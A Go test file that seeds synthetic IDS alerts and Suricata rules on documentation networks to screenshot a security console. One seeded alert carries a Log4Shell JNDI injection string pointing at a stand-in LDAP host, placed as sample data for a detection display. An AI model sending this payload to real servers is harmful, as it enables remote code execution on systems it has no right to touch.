package web

import (
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	"github.com/floreabogdan/meerkat/internal/geo"
	"github.com/floreabogdan/meerkat/internal/ingest"
	"github.com/floreabogdan/meerkat/internal/nftably"
	"github.com/floreabogdan/meerkat/internal/rules"
	"github.com/floreabogdan/meerkat/internal/store"
	"github.com/floreabogdan/meerkat/internal/suricata"
	"github.com/floreabogdan/meerkat/internal/triage"
)

// preview_test.go is the screenshot harness behind docs/screenshots/*.png.
//
// It is not a test of anything: it seeds a database, serves the *real* console
// over it, and drives headless Chrome across the pages. Going through the real
// handlers rather than hand-built view structs is the point — a screenshot then
// cannot drift from what the product actually renders, and the seed exercises
// the same store queries production does.
//
// Every address here is documentation space (RFC 5737 / RFC 3849) and every AS
// number is from RFC 5398's documentation range, so nothing in the published
// screenshots names a real network. The traffic *mix* is the real one measured
// on a live sensor — a reputation-feed flood with a couple of needles in it —
// because
// that mix is the argument the product makes.
//
// Run it with:
//
//	MEERKAT_PREVIEW=/path/to/chrome MEERKAT_PREVIEW_OUT=docs/screenshots \
//	  go test ./internal/web -run TestPreview -v
func TestPreview(t *testing.T) {
	chrome := os.Getenv("MEERKAT_PREVIEW")
	if chrome == "" {
		t.Skip("set MEERKAT_PREVIEW=<path to chrome> to render screenshots")
	}
	out := os.Getenv("MEERKAT_PREVIEW_OUT")
	if out == "" {
		t.Fatal("set MEERKAT_PREVIEW_OUT to a directory")
	}
	if err := os.MkdirAll(out, 0o755); err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	st, err := store.Open(filepath.Join(dir, "meerkat.db"))
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { st.Close() })

	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	previewSeed(t, st, dir)

	// A real reader, following a real file. Without one every page carries the
	// "the reader is not running" strip, which is a true statement about the
	// harness and a false one about the product. The file holds flow and stats
	// records only — the 98.5% of eve.json meerkat rejects without decoding — so
	// the reader is demonstrably alive without contradicting the seeded alerts.
	enricher, err := geo.Open(
		geo.PathIfExists("../geo/testdata/dbip-asn-lite.mmdb"),
		geo.PathIfExists("../geo/testdata/dbip-country-lite.mmdb"), "")
	if err != nil {
		t.Fatalf("open geo: %v", err)
	}
	defer enricher.Close()

	in := ingest.New(ingest.Config{
		Store: st, Geo: enricher, Log: log,
		EvePath:   writePreviewEve(t, filepath.Join(dir, "eve.json")),
		FromStart: true,
		Retention: 7 * 24 * time.Hour,
		MaxEvents: 5_000_000,
	})
	go func() { _ = in.Run(t.Context()) }()
	waitFor(t, func() bool { return in.Stats().LinesRead > 0 })

	// A configured nftably makes the block controls render. Nothing here ever
	// POSTs, so no call is made — CanBlock() only asks whether it is configured.
	tri := triage.New(st, nftably.New("http://127.0.0.1:8080", "preview-token", "meerkat/preview"), log)

	// A stub suricata-update and a live control socket, so the rules page shows
	// a manageable sensor rather than the two "this box has no Suricata on it"
	// notices that are true of the machine taking the screenshots and of nowhere
	// the product actually runs. Both are only ever probed, never invoked.
	updater := filepath.Join(dir, "suricata-update")
	if err := os.WriteFile(updater, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	sockPath := filepath.Join(dir, "suricata-command.socket")
	if ln, err := net.Listen("unix", sockPath); err == nil {
		defer ln.Close()
		go func() {
			for {
				c, err := ln.Accept()
				if err != nil {
					return
				}
				_ = c.Close()
			}
		}()
	}

	ruleMgr := rules.New(rules.Config{
		Store: st,
		Paths: suricata.Paths{
			Staging:   filepath.Join(dir, "suricata"),
			ConfDir:   filepath.Join(dir, "etc"),
			RulesFile: filepath.Join(dir, "suricata.rules"),
			DataDir:   dir,
			Socket:    sockPath,
			UpdateBin: updater,
		},
		Log: log,
	})
	if _, err := ruleMgr.Index(); err != nil {
		t.Fatalf("index rules: %v", err)
	}

	srv := New(Config{
		Store:      st,
		Geo:        enricher,
		Ingest:     in,
		Triage:     tri,
		Rules:      ruleMgr,
		Log:        log,
		ListenAddr: "0.0.0.0:8100",
		DataDir:    dir,
	})
	cookie := login(t, srv)

	// Chrome starts with an empty cookie jar and there is no way to seed one
	// from the command line, so the harness carries the session on the request.
	// The theme cookie needs no help: the server re-issues it from the database
	// on every authenticated request, and Set-Cookie lands before first paint.
	authed := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if _, err := r.Cookie(sessionCookieName); err != nil {
			r.AddCookie(cookie)
		}
		srv.ServeHTTP(w, r)
	})
	ts := httptest.NewServer(authed)
	defer ts.Close()

	shoot := func(name, path, size string) {
		t.Helper()
		png := filepath.Join(out, name+".png")
		cmd := exec.Command(chrome, "--headless", "--disable-gpu", "--hide-scrollbars",
			"--force-device-scale-factor=2", "--virtual-time-budget=2500",
			"--screenshot="+png, "--window-size="+size, ts.URL+path)
		if b, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("chrome %s: %v\n%s", name, err, b)
		}
		info, err := os.Stat(png)
		if err != nil {
			t.Fatalf("chrome wrote no %s", png)
		}
		t.Logf("wrote %s (%d KB)", png, info.Size()/1024)
	}

	// Light first, then the whole set again in dark where it is worth showing:
	// the theme comes from the database, so it is switched between groups rather
	// than smuggled in per request.
	light := []struct{ name, path, size string }{
		{"sources", "/sources", "1600,1180"},
		{"dashboard", "/", "1600,1500"},
		{"source-detail", "/sources/198.51.100.34", "1600,1500"},
		{"rules", "/rules?tab=catalogue", "1600,1250"},
		{"signatures", "/signatures", "1600,900"},
		{"timeline", "/timeline", "1600,900"},
		{"live", "/live", "1600,900"},
		{"settings", "/settings", "1600,1000"},
	}
	for _, s := range light {
		shoot(s.name, s.path, s.size)
	}

	if err := st.SaveTheme("dark", "green", ""); err != nil {
		t.Fatal(err)
	}
	dark := []struct{ name, path, size string }{
		{"sources-dark", "/sources", "1600,1180"},
		{"dashboard-dark", "/", "1600,1500"},
	}
	for _, s := range dark {
		shoot(s.name, s.path, s.size)
	}

	// The login page is public, so it needs no session — and it is the first
	// thing anyone actually sees.
	if err := st.SaveTheme("light", "green", ""); err != nil {
		t.Fatal(err)
	}
	shoot("login", "/login", "1200,760")
}

// previewSeed fills the database with the traffic mix a live sensor produces: a
// reputation-feed flood that is 85% of the volume and none of the signal, a
// handful of scanners, and one compromised host. It also writes the ruleset
// file the catalogue is indexed from.
func previewSeed(t *testing.T, st *store.Store, dir string) {
	t.Helper()

	if err := st.SaveIdentity("edge1.example.net", "0.0.0.0:8100"); err != nil {
		t.Fatal(err)
	}
	hash, err := HashPassword("correct horse battery")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := st.CreateUser("admin", hash); err != nil {
		t.Fatal(err)
	}
	if err := st.SaveIngest("/var/log/suricata/eve.json", "/var/lib/meerkat/tail.state", 7, 5_000_000); err != nil {
		t.Fatal(err)
	}
	if err := st.SaveNftably("http://127.0.0.1:8080", "preview-token"); err != nil {
		t.Fatal(err)
	}
	if err := st.SaveAccessWhitelist("192.0.2.0/24\n2001:db8:1::/48"); err != nil {
		t.Fatal(err)
	}

	// ── the alerts ───────────────────────────────────────────────────────
	//
	// Shares match the four-minute measurement in the README: ET CINS 68.8%,
	// ET DROP 16.3%, GPL ICMP 10.6%, SURICATA 2.6%, ET SCAN 1.4%,
	// ET COMPROMISED 0.3%.
	type sig struct {
		sid      int
		rev      int
		name     string
		class    string
		ruleCat  string
		severity int
	}
	var (
		cins  = sig{2403300, 110384, "ET CINS Active Threat Intelligence Poor Reputation IP group 1", "Misc Attack", "ET CINS", 2}
		drop  = sig{2400000, 4774, "ET DROP Spamhaus DROP Listed Traffic Inbound group 1", "Misc Attack", "ET DROP", 2}
		ping  = sig{2100384, 8, "GPL ICMP_INFO PING BSDtype", "Misc activity", "GPL ICMP", 3}
		strm  = sig{2210000, 2, "SURICATA STREAM 3way handshake with ack in wrong dir", "Generic Protocol Command Decode", "SURICATA", 3}
		ack   = sig{2210045, 2, "SURICATA STREAM Packet with invalid ack", "Generic Protocol Command Decode", "SURICATA", 3}
		ssh   = sig{2001219, 22, "ET SCAN Potential SSH Scan", "Attempted Information Leak", "ET SCAN", 2}
		mssql = sig{2010935, 4, "ET SCAN Suspicious inbound to MSSQL port 1433", "Attempted Information Leak", "ET SCAN", 2}
		nbt   = sig{2001581, 12, "ET SCAN Behavioral Unusual Port 445 traffic", "Misc activity", "ET SCAN", 3}
		comp  = sig{2500000, 7690, "ET COMPROMISED Known Compromised or Hostile Host Traffic group 1", "Misc Attack", "ET COMPROMISED", 1}
		agent = sig{2013028, 6, "ET USER_AGENTS Suspicious User-Agent (python-requests)", "A Network Trojan was detected", "ET USER_AGENTS", 2}
		expl  = sig{2036923, 3, "ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Attempt", "Attempted Administrator Privilege Gain", "ET EXPLOIT", 1}
		wordp = sig{2019233, 5, "ET WEB_SERVER WordPress wp-login.php Brute Force Attempt", "Web Application Attack", "ET WEB_SERVER", 2}
		telnt = sig{2023753, 4, "ET POLICY Telnet Login Attempt from External Host", "Potentially Bad Traffic", "ET POLICY", 3}
	)

	// Documentation networks (RFC 5737 / RFC 3849) with documentation ASNs
	// (RFC 5398). The labels are plausible, not real.
	type where struct {
		asn     uint32
		org     string
		cc      string
		country string
		city    string
		lat     float64
		lon     float64
	}
	places := []where{
		{64496, "Example Transit Networks", "NL", "Netherlands", "Amsterdam", 52.37, 4.89},
		{64497, "Example Hosting BV", "DE", "Germany", "Frankfurt", 50.11, 8.68},
		{64498, "Example Cloud Services", "US", "United States", "Ashburn", 39.04, -77.49},
		{64499, "Example Telecom", "RO", "Romania", "Bucharest", 44.43, 26.10},
		{64500, "Example Broadband", "VN", "Vietnam", "Hanoi", 21.03, 105.85},
		{64501, "Example IDC", "CN", "China", "Shanghai", 31.23, 121.47},
		{64502, "Example Datacenter", "RU", "Russia", "Moscow", 55.75, 37.62},
		{64503, "Example ISP", "BR", "Brazil", "São Paulo", -23.55, -46.63},
		{64504, "Example Colocation", "IN", "India", "Mumbai", 19.08, 72.88},
		{64505, "Example Networks", "SG", "Singapore", "Singapore", 1.35, 103.82},
	}

	now := time.Now().UTC().Truncate(time.Minute)
	var batch []store.Alert

	// A deterministic LCG, so the same seed produces the same screenshots. The
	// arrival times have to look like traffic rather than like a for-loop: real
	// scanning is bursty, and a chart of evenly spaced bars would misrepresent
	// what the retention and volume numbers on the dashboard are describing.
	rnd := uint64(20260723)
	next := func(n int) int {
		rnd = rnd*6364136223846793005 + 1442695040888963407
		return int(rnd>>33) % n
	}
	// ago picks a moment in the last day, weighted towards the recent burst:
	// two in five land inside the last 90 minutes.
	ago := func() time.Duration {
		if next(5) < 2 {
			return time.Duration(next(90))*time.Minute + time.Duration(next(60))*time.Second
		}
		return time.Duration(next(1380))*time.Minute + time.Duration(next(60))*time.Second
	}

	add := func(ip string, w where, s sig, port int, at time.Time, extra string) {
		batch = append(batch, store.Alert{
			Ts: at, SrcIP: ip, SrcPort: 32768 + next(32000),
			DestIP: "192.0.2.10", DestPort: port, Proto: "TCP",
			SID: s.sid, GID: 1, Rev: s.rev, Sig: s.name,
			Category: s.class, RuleCategory: s.ruleCat, Severity: s.severity,
			Action: "allowed", FlowID: int64(1_700_000_000_000 + len(batch)), Extra: extra,
			ASN: w.asn, ASOrg: w.org, Country: w.cc, CountryName: w.country,
			City: w.city, Lat: w.lat, Lon: w.lon,
		})
	}

	// The reputation flood: many addresses, a handful of alerts each, saying
	// nothing except "this address is on a list". 85% of the volume, and the
	// reason the home page is a list of sources rather than of events.
	feedPorts := []int{445, 23, 3389, 22, 1433, 5900, 8080}
	for i := range 44 {
		w := places[i%len(places)]
		ip := fmt.Sprintf("198.51.100.%d", 20+i)
		s := cins
		if i%5 == 0 {
			s = drop
		}
		for range 5 + next(20) {
			add(ip, w, s, feedPorts[next(len(feedPorts))], now.Add(-ago()), "")
		}
		// A third of them are also doing something a behavioural rule notices,
		// so the Sigs column is not a column of ones.
		if i%3 == 0 {
			for range 1 + next(4) {
				add(ip, w, nbt, 445, now.Add(-ago()), "")
			}
		}
	}

	// ICMP: a few noisy pingers, and the reason 10% of a sensor's output is
	// somebody's monitoring system.
	for i := range 6 {
		w := places[(i+3)%len(places)]
		ip := fmt.Sprintf("203.0.113.%d", 40+i)
		for range 12 + next(18) {
			add(ip, w, ping, 0, now.Add(-ago()), "")
		}
	}

	// Engine events: not an attacker at all, and worth being able to mute.
	for i := range 4 {
		w := places[(i+6)%len(places)]
		ip := fmt.Sprintf("203.0.113.%d", 80+i)
		s := strm
		if i%2 == 1 {
			s = ack
		}
		for range 5 + next(9) {
			add(ip, w, s, []int{443, 80, 993}[next(3)], now.Add(-ago()), "")
		}
	}

	// Web noise: credential stuffing and an opportunistic exploit attempt —
	// the things a reputation list would never have told you about.
	for i := range 5 {
		w := places[(i+2)%len(places)]
		ip := fmt.Sprintf("203.0.113.%d", 120+i)
		for range 4 + next(11) {
			add(ip, w, wordp, 443, now.Add(-ago()), `{"http_host":"www.example.net","http_url":"/wp-login.php","http_method":"POST","user_agent":"python-requests/2.31.0"}`)
		}
		if i%2 == 0 {
			add(ip, w, agent, 80, now.Add(-ago()), `{"user_agent":"python-requests/2.31.0"}`)
		}
	}
	add("203.0.113.150", places[8], expl, 443, now.Add(-4*time.Hour),
		`{"http_host":"www.example.net","http_url":"/api/v1/login","user_agent":"${jndi:ldap://198.18.0.1/a}"}`)
	add("203.0.113.150", places[8], agent, 443, now.Add(-4*time.Hour-90*time.Second), "")

	// Telnet: still, in 2026.
	for i := range 3 {
		ip := fmt.Sprintf("203.0.113.%d", 200+i)
		for range 3 + next(7) {
			add(ip, places[(i+4)%len(places)], telnt, 23, now.Add(-ago()), "")
		}
	}

	// The needle. 198.51.100.34 is what the source-detail screenshot opens: a
	// scanner working several ports over half an hour, then tripping the
	// compromised-host feed as well — the combination that makes it a decision
	// rather than another row.
	scanner := places[5]
	for h := range 74 {
		port := []int{22, 22, 22, 2222, 22022}[h%5]
		s := ssh
		if h%9 == 4 {
			s, port = mssql, 1433
		}
		extra := ""
		if h%7 == 0 {
			extra = `{"ssh_client":"libssh_0.9.6"}`
		}
		at := now.Add(-time.Duration(44-h/2)*time.Minute - time.Duration(next(60))*time.Second)
		add("198.51.100.34", scanner, s, port, at, extra)
	}
	for h := range 11 {
		add("198.51.100.34", scanner, comp, 22,
			now.Add(-time.Duration(34-h*3)*time.Minute-time.Duration(next(60))*time.Second), "")
	}

	// A second scanner, and one host that is on a blocklist *and* knocking on
	// RDP — the case where the feeds turn out to be right.
	for range 26 {
		add("198.51.100.77", places[2], ssh, 22, now.Add(-ago()), "")
	}
	for h := range 17 {
		s := comp
		if h%2 == 0 {
			s = cins
		}
		add("198.51.100.91", places[6], s, 3389, now.Add(-ago()), "")
	}

	// Something inside the network tripping a rule: no geo, and called out as
	// local rather than left looking like an unknown foreign host.
	for h := range 5 {
		batch = append(batch, store.Alert{
			Ts: now.Add(-time.Duration(h*37) * time.Minute), SrcIP: "192.0.2.51", SrcPort: 51000 + h,
			DestIP: "192.0.2.1", DestPort: 53, Proto: "UDP",
			SID: ack.sid, GID: 1, Rev: ack.rev, Sig: ack.name, Category: ack.class,
			RuleCategory: ack.ruleCat, Severity: ack.severity, Action: "allowed", IsLocal: true,
		})
	}

	// IPv6 is not a special case in the data model, and the console should not
	// look like it is.
	for range 22 {
		add(fmt.Sprintf("2001:db8:3f::%x", 200+next(4)), places[1], cins, 22, now.Add(-ago()), "")
	}

	if err := st.RecordAlerts(batch); err != nil {
		t.Fatalf("record alerts: %v", err)
	}
	t.Logf("seeded %d alerts", len(batch))

	// ── decisions ────────────────────────────────────────────────────────
	//
	// A console full of untouched rows understates the product: the point is
	// that the flood becomes a small number of decisions.
	if err := st.SetSourceState("198.51.100.34", store.StateBlocked,
		"SSH brute force plus a compromised-host hit", "admin"); err != nil {
		t.Fatal(err)
	}
	if err := st.SetSourceStateUntil("198.51.100.91", store.StateBlocked,
		"RDP knocking from a Spamhaus-listed host", "admin", time.Now().Add(24*time.Hour)); err != nil {
		t.Fatal(err)
	}
	if err := st.SetSourceState("198.51.100.77", store.StateAcknowledged,
		"Known scanner, no successful auth in the logs", "admin"); err != nil {
		t.Fatal(err)
	}
	if err := st.SetSourceState("192.0.2.51", store.StateAllowlisted,
		"Our own resolver — the rule is wrong, not the host", "admin"); err != nil {
		t.Fatal(err)
	}

	actions := []store.Action{
		{Actor: "admin", Action: store.ActionBlock, Target: "198.51.100.34",
			Reason: "SSH brute force plus a compromised-host hit", Result: "added to nftably set meerkat_blocked", OK: true},
		{Actor: "admin", Action: store.ActionBlock, Target: "198.51.100.91", TTLSecs: 86400,
			Reason: "RDP knocking from a Spamhaus-listed host", Result: "added to nftably set meerkat_blocked", OK: true},
		{Actor: "admin", Action: store.ActionAcknowledge, Target: "198.51.100.77",
			Reason: "Known scanner, no successful auth in the logs", Result: "acknowledged", OK: true},
		{Actor: "admin", Action: store.ActionAllowlist, Target: "192.0.2.51",
			Reason: "Our own resolver — the rule is wrong, not the host", Result: "allowlisted", OK: true},
	}
	for _, a := range actions {
		if err := st.RecordAction(a); err != nil {
			t.Fatal(err)
		}
	}

	// Muting the reputation feeds is the one-click move the README describes.
	for _, s := range []struct {
		sid  int
		disp string
	}{
		{cins.sid, store.DispositionMute},
		{drop.sid, store.DispositionMute},
		{ping.sid, store.DispositionDigest},
		{strm.sid, store.DispositionDigest},
		{comp.sid, store.DispositionNotify},
		{ssh.sid, store.DispositionNotify},
	} {
		if err := st.SetDisposition(s.sid, s.disp); err != nil {
			t.Fatalf("disposition %d: %v", s.sid, err)
		}
	}

	audits := []struct{ kind, msg string }{
		{store.AuditLogin, "signed in"},
		{store.AuditSourceChange, "blocked 198.51.100.34 — SSH brute force plus a compromised-host hit"},
		{store.AuditSourceChange, "blocked 198.51.100.91 for 24h — RDP knocking from a Spamhaus-listed host"},
		{store.AuditSourceChange, "muted ET CINS Active Threat Intelligence Poor Reputation IP group 1"},
		{store.AuditSettings, "enrichment: monthly DB-IP Lite refresh enabled"},
		{store.AuditSourceChange, "allowlisted 192.0.2.51 — our own resolver"},
		{store.AuditRetention, "pruned 41,208 events older than 7 days"},
	}
	for _, a := range audits {
		if err := st.InsertAudit("admin", a.kind, a.msg); err != nil {
			t.Fatal(err)
		}
	}
	if err := st.InsertSystemAudit(store.AuditIngestError,
		"eve.json rotated; reopened at offset 0"); err != nil {
		t.Fatal(err)
	}

	// ── the ruleset, and the decisions taken over it ─────────────────────
	writePreviewRuleset(t, filepath.Join(dir, "suricata.rules"))

	// Two categories already switched off in the built ruleset (so they match
	// and count as applied), two individual rules decided but not yet applied
	// (so the "waiting to apply" tile has something to say), and two rules set
	// to block on sight — which pushes the source to nftably and never, ever
	// rewrites a Suricata action to drop.
	policies := []store.RulePolicy{
		{Scope: store.RuleScopeCategory, Key: "ET INFO", State: store.RuleStateDisabled,
			Note: "Not actionable on a transit router", Actor: "admin"},
		{Scope: store.RuleScopeCategory, Key: "ET POLICY", State: store.RuleStateDisabled,
			Note: "Policy rules are for a corporate LAN, not an edge", Actor: "admin"},
		{Scope: store.RuleScopeSID, Key: "2210000", State: store.RuleStateDisabled,
			Note: "Engine event, not a detection — 3% of volume", Actor: "admin"},
		{Scope: store.RuleScopeSID, Key: "2100384", State: store.RuleStateDisabled,
			Note: "Somebody's monitoring system", Actor: "admin"},
		{Scope: store.RuleScopeSID, Key: "2500000", AutoBlock: true, AutoBlockTTL: 86400,
			Note: "Compromised-host feed: block for a day on sight", Actor: "admin"},
		{Scope: store.RuleScopeSID, Key: "2036923", AutoBlock: true, Severity: 1,
			Note: "Log4Shell — block indefinitely", Actor: "admin"},
	}
	for _, p := range policies {
		if err := st.SetRulePolicy(p); err != nil {
			t.Fatalf("rule policy %s/%s: %v", p.Scope, p.Key, err)
		}
	}

	runs := []store.RuleRun{
		{Kind: "apply", Actor: "admin", Reason: "Disable ET INFO; mute the ICMP ping rule",
			OK: true, Step: "reload", RulesTotal: 3608, RulesEnabled: 2401, Removed: 24, Reloaded: true,
			StartedAt: time.Now().Add(-26 * time.Hour), FinishedAt: time.Now().Add(-26*time.Hour + 94*time.Second),
			Detail: "suricata-update rebuilt the ruleset; suricata reloaded without dropping a session"},
		{Kind: "update", Actor: "", Reason: "scheduled ruleset update",
			OK: true, Step: "reload", RulesTotal: 3608, RulesEnabled: 2401, Added: 137, Removed: 12, Reloaded: true,
			StartedAt: time.Now().Add(-9 * time.Hour), FinishedAt: time.Now().Add(-9*time.Hour + 111*time.Second)},
		{Kind: "apply", Actor: "admin", Reason: "Block on sight for the compromised-host feed",
			OK: false, Step: "suricata-update", Error: "exit status 1",
			StartedAt: time.Now().Add(-5 * time.Hour), FinishedAt: time.Now().Add(-5*time.Hour + 12*time.Second),
			Detail: "the previous ruleset is still loaded — nothing changed on the sensor"},
	}
	for _, r := range runs {
		if _, err := st.RecordRuleRun(r); err != nil {
			t.Fatal(err)
		}
	}
	if err := st.SetRulesLastUpdate(time.Now().Add(-9 * time.Hour)); err != nil {
		t.Fatal(err)
	}
}

// writePreviewEve writes the file the reader follows. It is deliberately all
// flow and stats records: on a live sensor that is 98.5% of eve.json, and it
// lets the harness show a genuinely healthy reader without a second, unenriched
// copy of the alerts arriving behind the seeded ones.
func writePreviewEve(t *testing.T, path string) string {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	ts := time.Now().UTC().Add(-3 * time.Minute)
	for i := range 2400 {
		at := ts.Add(time.Duration(i) * 75 * time.Millisecond).Format("2006-01-02T15:04:05.000000-0700")
		var line string
		switch {
		case i%400 == 399:
			line = fmt.Sprintf(`{"timestamp":"%s","event_type":"stats","stats":{"uptime":86213,"capture":{"kernel_packets":%d,"kernel_drops":0}}}`, at, 2_600_000+i*137)
		case i%7 == 0:
			line = fmt.Sprintf(`{"timestamp":"%s","flow_id":%d,"event_type":"dns","src_ip":"192.0.2.51","dest_ip":"192.0.2.1","dest_port":53,"proto":"UDP","dns":{"type":"query","rrname":"example.net"}}`, at, 1_800_000_000_000+i)
		default:
			line = fmt.Sprintf(`{"timestamp":"%s","flow_id":%d,"event_type":"flow","src_ip":"198.51.100.%d","dest_ip":"192.0.2.10","src_port":%d,"dest_port":443,"proto":"TCP","flow":{"pkts_toserver":%d,"pkts_toclient":%d,"state":"closed"}}`,
				at, 1_800_000_000_000+i, 20+i%44, 32768+i%30000, 3+i%40, 2+i%37)
		}
		if _, err := fmt.Fprintln(f, line); err != nil {
			t.Fatal(err)
		}
	}
	return path
}

// waitFor polls cond until it holds, so the harness never screenshots a page
// mid-startup.
func waitFor(t *testing.T, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatal("timed out waiting for the reader to start")
}

// writePreviewRuleset generates a ruleset file large and varied enough that the
// catalogue page looks like the one on a real sensor. It is the real file
// format — the catalogue is built by the real scanner reading it.
func writePreviewRuleset(t *testing.T, path string) {
	t.Helper()

	cats := []struct {
		prefix    string
		classtype string
		severity  string
		count     int
		// allOff marks a category the operator has switched off wholesale: every
		// rule in it is commented out, which is what suricata-update's
		// disable.conf produces and what the matching category policy asserts.
		allOff bool
		// disabledEvery n comments out every nth rule, the ordinary state of a
		// ruleset somebody has been pruning for a while.
		disabledEvery int
	}{
		{prefix: "ET INFO", classtype: "misc-activity", severity: "Informational", count: 620, allOff: true},
		{prefix: "ET SCAN", classtype: "attempted-recon", severity: "Informational", count: 340, disabledEvery: 7},
		{prefix: "ET MALWARE", classtype: "trojan-activity", severity: "Major", count: 780},
		{prefix: "ET EXPLOIT", classtype: "attempted-admin", severity: "Major", count: 410},
		{prefix: "ET WEB_SPECIFIC_APPS", classtype: "web-application-attack", severity: "Major", count: 690, disabledEvery: 11},
		{prefix: "ET POLICY", classtype: "policy-violation", severity: "Informational", count: 260, allOff: true},
		{prefix: "ET DOS", classtype: "attempted-dos", severity: "Major", count: 120},
		{prefix: "ET CINS", classtype: "misc-attack", severity: "Major", count: 40},
		{prefix: "ET DROP", classtype: "misc-attack", severity: "Minor", count: 24},
		{prefix: "ET COMPROMISED", classtype: "misc-attack", severity: "Major", count: 12},
		{prefix: "GPL ICMP_INFO", classtype: "misc-activity", severity: "Informational", count: 96, disabledEvery: 3},
		{prefix: "SURICATA", classtype: "protocol-command-decode", severity: "Informational", count: 210, disabledEvery: 5},
	}

	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()

	// Well clear of the real SIDs the seeded alerts carry: a generated rule
	// colliding with one of those would rename it in the catalogue and the
	// screenshots would contradict themselves.
	sid := 2600000
	total := 0
	for _, c := range cats {
		for i := range c.count {
			sid++
			total++
			line := fmt.Sprintf(
				`alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"%s %s M%d"; flow:established,to_server; classtype:%s; sid:%d; rev:%d; metadata:created_at 2019_07_26, signature_severity %s, updated_at 2026_07_20;)`,
				c.prefix, ruleSubject(i), 1+i%9, c.classtype, sid, 1+i%9, c.severity)
			if c.allOff || (c.disabledEvery > 0 && i%c.disabledEvery == 0) {
				line = "# " + line
			}
			if _, err := fmt.Fprintln(f, line); err != nil {
				t.Fatal(err)
			}
		}
	}

	// The signatures the seeded alerts fired have to exist in the catalogue too,
	// or the rules page would show hits against rules it has never heard of.
	fired := []string{
		`alert ip [198.51.100.0/24] any -> $HOME_NET any (msg:"ET CINS Active Threat Intelligence Poor Reputation IP group 1"; reference:url,www.cinsscore.com; classtype:misc-attack; sid:2403300; rev:110384; metadata:tag CINS, signature_severity Major, created_at 2013_10_08, updated_at 2026_07_20;)`,
		`alert ip [198.51.100.0/24] any -> $HOME_NET any (msg:"ET DROP Spamhaus DROP Listed Traffic Inbound group 1"; reference:url,www.spamhaus.org/drop/drop.txt; classtype:misc-attack; sid:2400000; rev:4774; metadata:tag Dshield, signature_severity Minor, created_at 2010_12_30, updated_at 2026_07_20;)`,
		`alert ip [198.51.100.0/24] any -> $HOME_NET any (msg:"ET COMPROMISED Known Compromised or Hostile Host Traffic group 1"; reference:url,danger.rulez.sk/projects/bruteforceblocker/blist.php; classtype:misc-attack; sid:2500000; rev:7690; metadata:tag COMPROMISED, signature_severity Major, created_at 2011_04_28, updated_at 2026_07_20;)`,
		`alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flow:to_server; flags:S; threshold:type both, track by_src, count 5, seconds 120; classtype:attempted-recon; sid:2001219; rev:22; metadata:created_at 2010_07_30, signature_severity Informational, updated_at 2019_07_26;)`,
		`alert tcp $EXTERNAL_NET any -> $HOME_NET 1433 (msg:"ET SCAN Suspicious inbound to MSSQL port 1433"; flow:to_server; flags:S; threshold:type limit, track by_src, count 5, seconds 60; classtype:bad-unknown; sid:2010935; rev:4; metadata:created_at 2010_07_30, signature_severity Informational, updated_at 2019_07_26;)`,
		`alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"GPL ICMP_INFO PING BSDtype"; icode:0; itype:8; content:"|08 09 0a 0b|"; depth:32; classtype:misc-activity; sid:2100384; rev:8; metadata:created_at 2010_09_23, signature_severity Informational, updated_at 2019_07_26;)`,
		`alert tcp any any -> any any (msg:"SURICATA STREAM 3way handshake with ack in wrong dir"; stream-event:3whs_ack_in_wrong_dir; classtype:protocol-command-decode; sid:2210000; rev:2;)`,
	}
	for _, line := range fired {
		if _, err := fmt.Fprintln(f, line); err != nil {
			t.Fatal(err)
		}
	}
	t.Logf("wrote %d rules to %s", total+len(fired), path)
}

// ruleSubject varies the generated rule names so the catalogue does not read as
// one string repeated a thousand times.
func ruleSubject(i int) string {
	subjects := []string{
		"Observed DNS Query to Suspicious Domain", "Suspicious User-Agent",
		"Possible Credential Harvesting", "Outbound Connection to Known Sinkhole",
		"Terse Request for TXT Record", "SSL/TLS Certificate Observed",
		"Base64 Encoded Payload Inbound", "Remote Command Execution Attempt",
		"Directory Traversal Attempt", "Suspicious POST to Admin Path",
		"Known Botnet CnC Beacon", "Anomalous TCP Window Size",
	}
	return subjects[i%len(subjects)]
}
